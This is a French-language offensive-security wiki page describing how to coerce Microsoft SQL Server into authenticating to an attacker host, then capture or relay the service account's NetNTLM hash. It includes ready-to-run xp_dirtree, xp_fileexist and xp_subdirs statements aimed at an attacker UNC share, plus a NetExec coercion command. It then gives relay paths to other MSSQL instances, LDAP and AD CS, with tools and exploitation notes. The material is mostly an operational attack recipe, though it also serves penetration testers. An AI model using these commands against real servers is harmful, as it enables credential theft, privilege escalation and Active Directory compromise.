---
order: 6
title: "Coercition et relais MSSQL : voler l'authentification du compte de service"
description: "Utiliser des procédures SQL Server comme xp_dirtree et xp_fileexist pour forcer l'instance à s'authentifier auprès d'un attaquant via SMB, capturant ou relayant le NetNTLM du compte de service pour escalader entre instances MSSQL ou vers Active Directory."
keywords:
  - xp_dirtree
  - xp_fileexist
  - relais NTLM
  - coercition MSSQL
  - compte de service
---

# Coercition et relais

SQL Server contacte un **chemin UNC** sur commande, et n'importe quelle connexion `public` peut généralement l'y amener via `xp_dirtree` ou `xp_fileexist`. Pointez ce chemin vers un listener d'attaquant et l'instance **s'authentifie avec son compte de service** via SMB, vous remettant une réponse NetNTLM à [capturer](../../directory/active-directory/authentication/ntlm/net-ntlm-capture-and-poisoning.md) et casser ou, bien mieux, à [relayer](../../directory/active-directory/authentication/ntlm/relay.md). Cela transforme une session de base de données peu privilégiée en déplacement entre instances ou dans le domaine, sans aucun droit sysadmin.

## Déclencher l'authentification sortante

```sql
-- any public login can usually call these; the UNC target is attacker-controlled
EXEC xp_dirtree '\\<attacker>\share', 1, 1;
EXEC xp_fileexist '\\<attacker>\share\x';
EXEC master.dbo.xp_subdirs '\\<attacker>\share';
```

```bash
# NetExec coerces the authentication for you
nxc mssql <target> -u user -p pass -M mssql_coerce -o LISTENER=<attacker-ip>
```

## Que faire de l'authentification obtenue par coercition

- **Relayer vers un autre MSSQL** où le compte de service est privilégié : relayer la connexion du compte de service vers une seconde instance peut vous promouvoir sysadmin sur celle-ci.
- **Relayer vers LDAP / AD CS** : le service MSSQL s'exécute souvent sous un compte de domaine, donc son authentification obtenue par coercition alimente RBCD, les shadow credentials ou un certificat exactement comme toute autre authentification de domaine [obtenue par coercition](../../directory/active-directory/authentication/ntlm/coercion.md).
- **Capturer et casser** le NetNTLM là où le mot de passe du compte de service est faible.

## Notes d'exploitation

- La coercition ne nécessite que **`public`**, elle fonctionne donc depuis le point d'appui le plus bas et avant toute escalade dans le moteur.
- La valeur dépend du **compte de service** : un compte de service de domaine fait de ceci une primitive de relais Active Directory, et pas seulement une astuce de base de données.
- `ntlmrelayx` prend en charge le relais vers des cibles MSSQL directement, donc un relais MSSQL vers MSSQL est une escalade de privilèges autonome entre instances.
- À combiner avec l'[énumération](enumeration.md) pour choisir une cible de relais où le compte obtenu par coercition est sysadmin.

## Outils

- **NetExec `mssql`** (`-M mssql_coerce`) : déclencher l'authentification sortante.
- **Impacket `mssqlclient.py`** : appeler `xp_dirtree`/`xp_fileexist` de manière interactive.
- **ntlmrelayx.py** : relayer l'authentification du compte de service obtenue par coercition vers MSSQL, LDAP ou AD CS.

## Références

- [Compass Security: relaying NTLM to MSSQL](https://blog.compass-security.com/2023/10/relaying-ntlm-to-mssql/)
- [0xdeaddood: relaying everything, coercing authentications episode 1, MSSQL](https://0xdeaddood.rocks/2023/02/28/relaying-everything-coercing-authentications-episode-1-mssql/)
- [HackTricks: pentesting MSSQL](https://hacktricks.wiki/en/network-services-pentesting/pentesting-mssql-microsoft-sql-server/index.html)
